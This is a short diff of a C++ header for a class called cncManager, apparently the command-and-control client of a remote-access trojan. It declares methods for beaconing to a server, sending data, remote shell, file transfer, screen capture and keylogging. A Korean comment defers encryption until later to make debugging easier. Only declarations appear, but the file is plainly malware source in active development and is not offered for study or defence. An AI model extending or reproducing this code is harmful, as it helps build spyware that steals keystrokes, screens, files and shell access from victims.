@@ -25,13 +25,13 @@ public:
 	cncManager(LPCWSTR server);
 	~cncManager();
 	void responseParser(UCHAR* res, DWORD len);
-	void sendHttpRequest(LPVOID data, DWORD dlen);
+	void sendHttpRequest(LPVOID data, DWORD dlen, DWORD buf_size = 0);
 	void sendBeacon();
-	void sendData(UCHAR DDtype, ULONG64 len, LPVOID stream);
+	void sendData(UCHAR DDtype, ULONG64 len, LPVOID stream, DWORD buf_size = 0);
 	void printParsedResponse(DDprotocol* resData, std::string data);
 	void handleShellRequest();
 	void handleFtpRequest(std::string path);
-	void handleFtpResponse(std::string data, DWORD seq);
+	void handleFtpResponse();
 	void handleScreenRequest();
 	void handleKeyLog();
 	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
@@ -39,4 +39,6 @@ public:
 	LPVOID dataDecrypt(LPVOID data);
 	bool print_setting = false;
 	std::mutex m1, m2;
+	FILE* fp = NULL;
+	DWORD save_seq = 0;
 };
